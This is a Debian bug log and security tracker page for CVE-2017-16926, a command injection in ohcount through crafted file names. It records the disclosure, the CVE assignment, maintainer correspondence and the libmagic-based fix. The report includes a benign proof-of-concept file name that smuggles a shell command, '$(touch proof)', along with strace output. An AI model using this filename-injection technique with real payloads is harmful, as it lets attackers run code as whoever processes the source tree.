=== Content from bugs.debian.org_6418a94b_20250125_230403.html ===

# Debian Bug report logs - #882372 ohcount: CVE-2017-16926: Command injection through file names

[![version graph](version.cgi?collapse=1;package=ohcount;absolute=0;fixed=ohcount%2F3.1.0-1;height=2;width=2;found=ohcount%2F3.0.0-8;found=ohcount%2F3.0.0-8.3)](version.cgi?package=ohcount;collapse=1;info=1;fixed=ohcount%2F3.1.0-1;found=ohcount%2F3.0.0-8;found=ohcount%2F3.0.0-8.3;absolute=0)

Package:
[ohcount](pkgreport.cgi?package=ohcount);
Maintainer for [ohcount](pkgreport.cgi?package=ohcount) is [Sylvestre Ledru <sylvestre@debian.org>](pkgreport.cgi?maint=sylvestre%40debian.org); Source for [ohcount](pkgreport.cgi?package=ohcount) is [src:ohcount](pkgreport.cgi?src=ohcount) ([PTS](https://tracker.debian.org/pkg/ohcount), [buildd](https://buildd.debian.org/ohcount), [popcon](https://qa.debian.org/popcon.php?package=ohcount)).

Reported by: [Jonathan Neuschäfer <j.neuschaefer@gmx.net>](pkgreport.cgi?submitter=j.neuschaefer%40gmx.net)

Date: Tue, 21 Nov 2017 21:27:02 UTC

Severity: *grave*

Tags: fixed-upstream, patch, security, upstream

Found in versions ohcount/3.0.0-8, ohcount/3.0.0-8.3

Fixed in version ohcount/3.1.0-1

**Done:** Salvatore Bonaccorso <carnil@debian.org>

Bug is archived. No further changes may be made.

Forwarded to <https://github.com/blackducksoftware/ohcount/issues/57>

Outlook: This issue is fixed in the latest version of ohcount: https://github.com/blackducksoftware/ohcount/releases/tag/v3.1.0

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=882372;mbox=yes), [status mbox](bugreport.cgi?bug=882372;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=882372;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, j.neuschaefer@gmx.net, carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Sylvestre Ledru <sylvestre@debian.org>`:

`Bug#882372`; Package `ohcount`.
(Tue, 21 Nov 2017 21:27:05 GMT) ([full text](bugreport.cgi?bug=882372;msg=2), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Jonathan Neuschäfer <j.neuschaefer@gmx.net>`:

New Bug report received and forwarded. Copy sent to `j.neuschaefer@gmx.net, carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Sylvestre Ledru <sylvestre@debian.org>`.
(Tue, 21 Nov 2017 21:27:05 GMT) ([full text](bugreport.cgi?bug=882372;msg=4), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=882372;msg=5), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=j.neuschaefer%40gmx.net)
From: Jonathan Neuschäfer <j.neuschaefer@gmx.net>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: ohcount: Command injection through file names
Date: Tue, 21 Nov 2017 22:24:44 +0100
```
Package: ohcount
Version: 3.0.0-8.3
Severity: grave
Tags: upstream security
Justification: user security hole

When ohcount tries to determine the type of a file with a specially
crafted name, it can execute arbitrary shell commands through improper
quoting. Details below.

## PoC

> $ echo hi > "test'\$(touch proof)'"
> $ ls
> test'$(touch proof)'
> $ ohcount .
> Examining 2 file(s)
>
>                           Ohloh Line Count Summary
>
> Language          Files       Code    Comment  Comment %      Blank      Total
> ----------------  -----  ---------  ---------  ---------  ---------  ---------
> ----------------  -----  ---------  ---------  ---------  ---------  ---------
> Total                 0          0          0       0.0%          0          0
> $ ls
> proof  test'$(touch proof)'

## How does it work?

I haven't read the source, so I can't point at the vulnerable line, but here's
a snippet of strace output (trimmed and indented for readability):

Processes:
26767: ohcount .
  26773: sh -c "file -b './test'$(touch proof)''"
    26776: touch proof
    26782: file -b ./test
  26791: sh -c "file -b '.'"
    26797 file -b .

26767 execve("/usr/bin/ohcount", ["ohcount", "."], [/* 52 vars */]) = 0
26767 write(1, "Examining 2 file(s)\n", 20) = 20
26767 open("./test'$(touch proof)'", O_RDONLY) = 3
26767 fstat(3, {st_mode=S_IFREG|0640, st_size=3, ...}) = 0
26767 read(3, "hi\n", 3)                = 3
26767 access("./test'$(touch proof)'", F_OK) = 0
26767 pipe2([3, 4], O_CLOEXEC)          = 0
26767 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f31736e69d0) = 26773
  26773 execve("/bin/sh", ["sh", "-c", "file -b './test'$(touch proof)''"], [/* 52 vars */]) = 0
  26773 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f601329d9d0) = 26776
    26776 stat("/usr/bin/touch", {st_mode=S_IFREG|0755, st_size=93160, ...}) = 0
    26776 execve("/usr/bin/touch", ["touch", "proof"], [/* 52 vars */]) = 0
    26776 open("proof", O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK, 0666) = 3
    26776 exit_group(0)                     = ?
    26776 +++ exited with 0 +++
  26773 <... wait4 resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 26776
  26773 stat("/usr/bin/file", {st_mode=S_IFREG|0755, st_size=22792, ...}) = 0
  26773 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f601329d9d0) = 26782
  26773 wait4(-1,  <unfinished ...>
    26782 execve("/usr/bin/file", ["file", "-b", "./test"], [/* 52 vars */]) = 0
    26782 lstat("./test", 0x7ffc9809f660)   = -1 ENOENT (No such file or directory)
    26782 stat("./test", 0x7ffc9809f660)    = -1 ENOENT (No such file or directory)
    26782 open("./test", O_RDONLY)          = -1 ENOENT (No such file or directory)
    26782 write(1, "cannot open `./test' (No such fi"..., 49 ) = 49
    26782 exit_group(0)                     = ?
    26782 +++ exited with 0 +++
  26773 exit_group(0)                     = ?
  26773 +++ exited with 0 +++
26767 open(".", O_RDONLY)               = 3
26767 fstat(3, {st_mode=S_IFDIR|0751, st_size=4096, ...}) = 0
26767 fstat(3, {st_mode=S_IFDIR|0751, st_size=4096, ...}) = 0
26767 lseek(3, 0, SEEK_END)             = 9223372036854775807
26767 lseek(3, 0, SEEK_SET)             = 0
26767 read(3, 0x56315aaed880, 18446744073709547520) = -1 EFAULT (Bad address)
26767 close(3)                          = 0
26767 access(".", F_OK)                 = 0
26767 pipe2([3, 4], O_CLOEXEC)          = 0
26767 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f31736e69d0) = 26791
  26791 execve("/bin/sh", ["sh", "-c", "file -b '.'"], [/* 52 vars */]) = 0
  26791 stat("/usr/bin/file", {st_mode=S_IFREG|0755, st_size=22792, ...}) = 0
  26791 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fb58ec689d0) = 26797
    26797 execve("/usr/bin/file", ["file", "-b", "."], [/* 52 vars */]) = 0
    26797 lstat(".", {st_mode=S_IFDIR|0751, st_size=4096, ...}) = 0
    26797 write(1, "directory\n", 10 <unfinished ...>
    26797 exit_group(0)                     = ?
    26797 +++ exited with 0 +++
  26791 exit_group(0)                     = ?
  26791 +++ exited with 0 +++
26767 write(1, "\n                          Ohloh"..., 79) = 79
26767 write(1, "Language          Files       Co"..., 158) = 158
26767 write(1, "----------------  -----  -------"..., 79) = 79
26767 write(1, "Total                 0         "..., 79) = 79
26767 exit_group(0)                     = ?
26767 +++ exited with 0 +++

## Disclosure, etc.

This is, AFAIK, a previously undisclosed vulnerability.

Salvatore Bonaccorso volunteered to request a CVE identifier for this
vulnerability.

-- System Information:
Debian Release: 9.2
  APT prefers stable-updates
  APT policy: (500, 'stable-updates'), (500, 'stable'), (500, 'oldstable')
Architecture: amd64 (x86_64)
Foreign Architectures: i386, mips, armhf, armel

Kernel: Linux 4.9.0-4-amd64 (SMP w/2 CPU cores)
Locale: LANG=en_US.UTF-8, LC_CTYPE=en_US.UTF-8 (charmap=UTF-8), LANGUAGE=en_US:en (charmap=UTF-8)
Shell: /bin/sh linked to /bin/dash
Init: systemd (via /run/systemd/system)

Versions of packages ohcount depends on:
ii  file           1:5.30-1+deb9u1
ii  libc6          2.24-11+deb9u1
ii  libpcre3       2:8.39-3
ii  ruby           1:2.3.3
ii  ruby-diff-lcs  1.2.5-2

ohcount recommends no packages.

Versions of packages ohcount suggests:
pn  ohcount-doc  <none>

-- no debconf information

```

---

**Marked as found in versions ohcount/3.0.0-8.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Wed, 22 Nov 2017 05:15:07 GMT) ([full text](bugreport.cgi?bug=882372;msg=7), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=7), [link](#6)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Sylvestre Ledru <sylvestre@debian.org>`:

`Bug#882372`; Package `ohcount`.
(Wed, 22 Nov 2017 09:15:03 GMT) ([full text](bugreport.cgi?bug=882372;msg=9), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=9), [link](#8)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Sylvestre Ledru <sylvestre@debian.org>`.
(Wed, 22 Nov 2017 09:15:03 GMT) ([full text](bugreport.cgi?bug=882372;msg=11), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=11), [link](#10)).

---

[Message #12](#12) received at 882372@bugs.debian.org ([full text](bugreport.cgi?bug=882372;msg=12), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=12), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: Jonathan Neuschäfer <j.neuschaefer@gmx.net>,
882372@bugs.debian.org
Subject: Re: Bug#882372: ohcount: Command injection through file names
Date: Wed, 22 Nov 2017 10:13:46 +0100
```
Control: retitle -1 ohcount: [CVE-2017-16926](https://security-tracker.debian.org/tracker/CVE-2017-16926): Command injection through file names

Hi Jonathan,

A CVE got assigned by MITRE for this issue: [CVE-2017-16926](https://security-tracker.debian.org/tracker/CVE-2017-16926).

Regards,
Salvatore

```

---

**Changed Bug title to 'ohcount: CVE-2017-16926: Command injection through file names' from 'ohcount: Command injection through file names'.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `882372-submit@bugs.debian.org`.
(Wed, 22 Nov 2017 09:15:03 GMT) ([full text](bugreport.cgi?bug=882372;msg=14), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=14), [link](#13)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Sylvestre Ledru <sylvestre@debian.org>`:

`Bug#882372`; Package `ohcount`.
(Thu, 23 Nov 2017 10:45:07 GMT) ([full text](bugreport.cgi?bug=882372;msg=16), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=16), [link](#15)).

---

**Acknowledgement sent**
to `Raphael Hertzog <hertzog@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Sylvestre Ledru <sylvestre@debian.org>`.
(Thu, 23 Nov 2017 10:45:07 GMT) ([full text](bugreport.cgi?bug=882372;msg=18), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=18), [link](#17)).

---

[Message #19](#19) received at 882372@bugs.debian.org ([full text](bugreport.cgi?bug=882372;msg=19), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=19), reply):

![](/cgi-bin/libravatar.cgi?email=hertzog%40debian.org)
From: Raphael Hertzog <hertzog@debian.org>
To: Sylvestre Ledru <sylvestre@debian.org>
Cc: debian-lts@lists.debian.org, 882372@bugs.debian.org
Subject: Wheezy update of ohcount?
Date: Thu, 23 Nov 2017 11:40:11 +0100
```
Hello Sylvestre,

The Debian LTS team would like to fix the security issues which are
currently open in the Wheezy version of ohcount:
<https://security-tracker.debian.org/tracker/CVE-2017-16926>

Would you like to take care of this yourself?

I tried to file an upstream bug as a first step (since there is not patch
available yet) but there is no upstream bug tracker apparently... and last
upstream activity dates back to 2010.  I pinged the project owner on
sourceforge with its integrated messaging feature but I'm not sure that I
will get any reply back.

Do you have contacts with the upstream authors ?

In any case, if you want to handle the wheezy upload, then
please follow the workflow we have defined here:
<https://wiki.debian.org/LTS/Development>

If that workflow is a burden to you, feel free to just prepare an
updated source package and send it to debian-lts@lists.debian.org
(via a debdiff, or with an URL pointing to the source package,
or even with a pointer to your packaging repository), and the members
of the LTS team will take care of the rest. Indicate clearly whether you
have tested the updated package or not.

If you don't want to take care of this update, it's not a problem, we
will do our best with your package. Just let us know whether you would
like to review and/or test the updated package before it gets released.

You can also opt-out from receiving future similar emails in your
answer and then the LTS Team will take care of ohcount updates
for the LTS releases.

Thank you very much.

Raphaël Hertzog,
  on behalf of the Debian LTS team.

PS: A member of the LTS team might start working on this update at
any point in time. You can verify whether someone is registered
on this update in this file:
<https://anonscm.debian.org/viewvc/secure-testing/data/dla-needed.txt?view=markup>
--
Raphaël Hertzog ◈ Debian Developer

Support Debian LTS: <https://www.freexian.com/services/debian-lts.html>
Learn to master Debian: <https://debian-handbook.info/get/>

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Sylvestre Ledru <sylvestre@debian.org>`:

`Bug#882372`; Package `ohcount`.
(Wed, 06 Dec 2017 20:51:09 GMT) ([full text](bugreport.cgi?bug=882372;msg=21), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=21), [link](#20)).

---

**Acknowledgement sent**
to `Peter Degen-Portnoy <pdegenportnoy@blackducksoftware.com>`:

Extra info received and forwarded to list. Copy sent to `Sylvestre Ledru <sylvestre@debian.org>`.
(Wed, 06 Dec 2017 20:51:09 GMT) ([full text](bugreport.cgi?bug=882372;msg=23), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=23), [link](#22)).

---

[Message #24](#24) received at 882372@bugs.debian.org ([full text](bugreport.cgi?bug=882372;msg=24), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=24), reply):

![](/cgi-bin/libravatar.cgi?email=pdegenportnoy%40blackducksoftware.com)
From: Peter Degen-Portnoy <pdegenportnoy@blackducksoftware.com>
To: "882372@bugs.debian.org" <882372@bugs.debian.org>
Subject: Re: Wheezy update of ohcount?
Date: Wed, 6 Dec 2017 20:49:58 +0000
```
[[Message part 1](bugreport.cgi?att=0;bug=882372;msg=24) (text/plain, inline)]
```
```
Dear Raphaël Hertzog;

Peter Degen-Portnoy of the Black Duck Open Hub development team here.  We maintain Ohcount and are aware of the defect. An issue has been opened in the GitHub repository for Ohcount: <https://github.com/blackducksoftware/ohcount/issues/57>

Work is currently underway to address the defect.

Sincerely,

Peter Degen-Portnoy

-----------

Black Duck Software

Peter Degen-Portnoy

Software Engineering Manager / Open Hub Team Lead
Black Duck Software
Black Duck Open Hub<<https://www.openhub.net/>>

On Thu, 23 Nov 2017 11:40:11 +0100 Raphael Hertzog wrote:
> Hello Sylvestre,
>
> The Debian LTS team would like to fix the security issues which are
> currently open in the Wheezy version of ohcount:
> <https://security-tracker.debian.org/tracker/CVE-2017-16926>
>
> Would you like to take care of this yourself?
>
> I tried to file an upstream bug as a first step (since there is not patch
> available yet) but there is no upstream bug tracker apparently... and last
> upstream activity dates back to 2010. I pinged the project owner on
> sourceforge with its integrated messaging feature but I'm not sure that I
> will get any reply back.
>
> Do you have contacts with the upstream authors ?
>
> In any case, if you want to handle the wheezy upload, then
> please follow the workflow we have defined here:
> <https://wiki.debian.org/LTS/Development>
>
> If that workflow is a burden to you, feel free to just prepare an
> updated source package and send it to debian-lts@lists.debian.org
> (via a debdiff, or with an URL pointing to the source package,
> or even with a pointer to your packaging repository), and the members
> of the LTS team will take care of the rest. Indicate clearly whether you
> have tested the updated package or not.
>
> If you don't want to take care of this update, it's not a problem, we
> will do our best with your package. Just let us know whether you would
> like to review and/or test the updated package before it gets released.
>
> You can also opt-out from receiving future similar emails in your
> answer and then the LTS Team will take care of ohcount updates
> for the LTS releases.
>
> Thank you very much.
>
> Raphaël Hertzog,
> on behalf of the Debian LTS team.
>
> PS: A member of the LTS team might start working on this update at
> any point in time. You can verify whether someone is registered
> on this update in this file:
> <https://anonscm.debian.org/viewvc/secure-testing/data/dla-needed.txt?view=markup>
> --
> Raphaël Hertzog ◈ Debian Developer
>
> Support Debian LTS: <https://www.freexian.com/services/debian-lts.html>
> Learn to master Debian: <https://debian-handbook.info/get/>
>
>

```
```
[[Message part 2](bugreport.cgi?att=1;bug=882372;msg=24) (text/html, inline)]
```

---

**Set Bug forwarded-to-address to '<https://github.com/blackducksoftware/ohcount/issues/57>'.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Wed, 06 Dec 2017 22:12:10 GMT) ([full text](bugreport.cgi?bug=882372;msg=26), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=26), [link](#25)).

---

**Added tag(s) patch.**
Request was from `notalexjohnson@gmail.com`
to `control@bugs.debian.org`.
(Thu, 07 Dec 2017 19:00:13 GMT) ([full text](bugreport.cgi?bug=882372;msg=28), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=28), [link](#27)).

---

**Outlook recorded from message bug 882372 message**
Request was from `notalexjohnson@gmail.com`
to `control@bugs.debian.org`.
(Thu, 07 Dec 2017 19:18:06 GMT) ([full text](bugreport.cgi?bug=882372;msg=30), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=30), [link](#29)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org`:

`Bug#882372`; Package `ohcount`.
(Thu, 07 Dec 2017 20:51:05 GMT) ([full text](bugreport.cgi?bug=882372;msg=32), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=32), [link](#31)).

---

**Acknowledgement sent**
to `Sylvestre Ledru <sylvestre@debian.org>`:

Extra info received and forwarded to list.
(Thu, 07 Dec 2017 20:51:06 GMT) ([full text](bugreport.cgi?bug=882372;msg=34), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=34), [link](#33)).

---

[Message #35](#35) received at 882372@bugs.debian.org ([full text](bugreport.cgi?bug=882372;msg=35), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=35), reply):

![](/cgi-bin/libravatar.cgi?email=sylvestre%40debian.org)
From: Sylvestre Ledru <sylvestre@debian.org>
To: 882372@bugs.debian.org, notalexjohnson@gmail.com
Subject: Re: Processed: Bug fix for ohcount #882372
Date: Thu, 7 Dec 2017 21:46:25 +0100
```
I don't see the patch fixing the issue?!

Thanks

Le 07/12/2017 à 20:18, Debian Bug Tracking System a écrit :
> Processing commands for control@bugs.debian.org:
>
>> outlook 882372 This issue is fixed in the latest version of ohcount: <https://github.com/blackducksoftware/ohcount/releases/tag/v3.1.0>
> Outlook recorded from message bug 882372 message
>> --
> Stopping processing here.
>
> Please contact me if you need assistance.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Sylvestre Ledru <sylvestre@debian.org>`:

`Bug#882372`; Package `ohcount`.
(Thu, 21 Dec 2017 08:57:06 GMT) ([full text](bugreport.cgi?bug=882372;msg=37), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=37), [link](#36)).

---

**Acknowledgement sent**
to `Raphael Hertzog <hertzog@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Sylvestre Ledru <sylvestre@debian.org>`.
(Thu, 21 Dec 2017 08:57:06 GMT) ([full text](bugreport.cgi?bug=882372;msg=39), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=39), [link](#38)).

---

[Message #40](#40) received at 882372@bugs.debian.org ([full text](bugreport.cgi?bug=882372;msg=40), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=40), reply):

![](/cgi-bin/libravatar.cgi?email=hertzog%40debian.org)
From: Raphael Hertzog <hertzog@debian.org>
To: Sylvestre Ledru <sylvestre@debian.org>
Cc: 882372@bugs.debian.org, notalexjohnson@gmail.com
Subject: Re: Processed: Bug fix for ohcount #882372
Date: Thu, 21 Dec 2017 09:52:39 +0100
```
Hello Sylvestre,

On Thu, 07 Dec 2017, Sylvestre Ledru wrote:
> I don't see the patch fixing the issue?!

The debian security tracker has a note with this patch:
<https://github.com/blackducksoftware/ohcount/commit/6bed45d6fb7c080ae5c163c12b4eb8749a3492ac>

It looks like the problematic "file" invocation has been replaced by
the use of libmagic.

Cheers,
--
Raphaël Hertzog ◈ Debian Developer

Support Debian LTS: <https://www.freexian.com/services/debian-lts.html>
Learn to master Debian: <https://debian-handbook.info/get/>

```

---

**Added tag(s) fixed-upstream.**
Request was from `bts-link-upstream@lists.alioth.debian.org`
to `control@bugs.debian.org`.
(Mon, 08 Jan 2018 17:09:33 GMT) ([full text](bugreport.cgi?bug=882372;msg=42), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=42), [link](#41)).

---

**Marked as fixed in versions ohcount/3.1.0-1.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Mon, 15 Jan 2018 07:39:03 GMT) ([full text](bugreport.cgi?bug=882372;msg=44), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=44), [link](#43)).

---

**Marked Bug as done**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Mon, 15 Jan 2018 07:39:04 GMT) ([full text](bugreport.cgi?bug=882372;msg=46), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=46), [link](#45)).

---

**Notification sent**
to `Jonathan Neuschäfer <j.neuschaefer@gmx.net>`:

Bug acknowledged by developer.
(Mon, 15 Jan 2018 07:39:05 GMT) ([full text](bugreport.cgi?bug=882372;msg=48), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=48), [link](#47)).

---

**Message sent on**
to `Jonathan Neuschäfer <j.neuschaefer@gmx.net>`:

Bug#882372.
(Mon, 15 Jan 2018 07:39:07 GMT) ([full text](bugreport.cgi?bug=882372;msg=50), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=50), [link](#49)).

---

[Message #51](#51) received at 882372-submitter@bugs.debian.org ([full text](bugreport.cgi?bug=882372;msg=51), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=51), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: control@bugs.debian.org
Cc: 882372-submitter@bugs.debian.org
Subject: closing 882372
Date: Mon, 15 Jan 2018 08:34:59 +0100
```
close 882372 3.1.0-1
thanks

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Sun, 07 Jul 2019 07:54:11 GMT) ([full text](bugreport.cgi?bug=882372;msg=53), [mbox](bugreport.cgi?bug=882372;mbox=yes;msg=53), [link](#52)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=882372).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sat Jan 25 23:04:03 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from security-tracker.debian.org_887d2a94_20250126_123914.html ===

# CVE-2017-16926

| **Name** | CVE-2017-16926 |
| --- | --- |
| **Description** | Ohcount 3.0.0 is prone to a command injection via specially crafted filenames containing shell metacharacters, which can be exploited by an attacker (providing a source tree for Ohcount processing) to execute arbitrary code as the user running Ohcount. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2017-16926) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-16926); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2017-16926), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2017-16926), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2017-16926), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2017-16926), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-16926), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2017-16926), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2017-16926), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2017-16926)/[CVE](https://www.suse.com/security/cve/CVE-2017-16926/), GitHub [advisories](https://github.com/advisories?query=CVE-2017-16926)/[code](https://github.com/search?type=Code&q=%22CVE-2017-16926%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2017-16926%22), [web search](https://duckduckgo.com/html?q=%22CVE-2017-16926%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **Debian Bugs** | [882372](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=882372) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [ohcount](/tracker/source-package/ohcount) ([PTS](https://tracker.debian.org/pkg/ohcount)) | bullseye | 4.0.0-1 | fixed |
|  | bookworm | 4.0.0-3 | fixed |
|  | sid, trixie | 4.0.0-5 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [ohcount](/tracker/source-package/ohcount) | source | (unstable) | 3.1.0-1 |  |  | [882372](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=882372) |

## Notes

```
[stretch] - ohcount <no-dsa> (Minor issue)
[jessie] - ohcount <no-dsa> (Minor issue)
[wheezy] - ohcount <no-dsa> (Minor issue)
<https://github.com/blackducksoftware/ohcount/commit/6bed45d6fb7c080ae5c163c12b4eb8749a3492ac> (v3.1.0)

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)


